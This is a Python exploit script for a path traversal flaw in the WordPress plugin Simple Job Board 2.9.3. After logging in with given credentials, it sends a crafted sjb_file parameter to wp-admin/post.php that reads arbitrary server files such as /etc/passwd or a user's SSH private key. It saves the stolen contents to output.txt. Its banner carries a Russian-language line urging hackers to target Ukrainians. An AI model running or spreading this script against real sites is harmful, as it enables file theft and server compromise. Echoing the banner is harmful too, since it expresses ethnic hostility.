#!/usr/bin/python3


# Date: 2022-02-25
# Exploit Author: mil3z
# Vendor Homepage: https://wordpress.org/plugins/simple-job-board/
# Software Link: https://downloads.wordpress.org/plugin/simple-job-board.2.9.3.zip


import requests
import sys
import time

class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]    
    

def banner():
    run = color_random[6]+'''\nY88b         /               
 

███████████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░█░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░░░░░▄▀░░░░░░█
█░░▄▀░░█████████░░▄▀░░██░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███████░░▄▀░░█████
█░░▄▀░░█████████░░▄▀░░░░░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███████░░▄▀░░█████
█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█████░░░░▄▀░░░░█████░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███████░░▄▀░░█████
█░░▄▀░░█████████░░▄▀░░░░░░▄▀░░███████░░▄▀░░███████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███████░░▄▀░░█████
█░░▄▀░░█████████░░▄▀░░██░░▄▀░░███████░░▄▀░░███████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████████░░▄▀░░█████
█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░███████░░▄▀░░███████░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█████░░▄▀░░█████
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░███████░░▄▀░░███████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█████░░▄▀░░█████
█░░░░░░░░░░░░░░█░░░░░░██░░░░░░███████░░░░░░███████░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█████░░░░░░█████
███████████████████████████████████████████████████████████████████████████████████████████████████
                                                                                      \n'''
    run2 = color_random[2]+'''\t\t\tПривет хакер, пора грузить украинцев. Создан для матушки России\n'''           
    run3 = color_random[4]+'''\t{Создано mile_403 | Github: https://github.com/mile403/ }\n\n'''
    print(run+run2+run3)           
               
    

if (len(sys.argv) != 5):
    banner()
    print("[!] Usage   : ./chyort.py <target_url> <file_path> <USER> <PASS>")
    print("[~] Example : ./chyort.py http://target.com:8080/wordpress/ /etc/passwd admin admin")
    exit()

else:
    banner()
    fetch_path = sys.argv[2]
    print (color_random[5]+"[+] Trying to fetch the contents from "+fetch_path)
    time.sleep(3)
    target_url = sys.argv[1]
    usernamex = sys.argv[3]
    passwordx = sys.argv[4]
    print("\n")
    login = target_url+"wp-login.php"
    wp_path = target_url+'wp-admin/post.php?post=application_id&action=edit&sjb_file='+fetch_path #/home/frank/.ssh/id_rsa
    username = usernamex
    password = passwordx

    with requests.Session() as s:
        headers = { 'Cookie':'wordpress_test_cookie=WP Cookie check',
                 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15' }

        post_data={ 'log':username, 'pwd':password, 
                   'wp-submit':'Log In','redirect_to':wp_path, 
                   'testcookie':'1'
                       }  
         
        s.post(login, headers=headers, data=post_data)
        resp = s.get(wp_path)
    
        out_file = open("output.txt", "w")
        print(resp.text, file=out_file)
        out_file.close()
        print(color_random[4]+resp.text)
        out = color_random[5]+"\n[+] Output Saved as: output.txt\n"
        print(out)
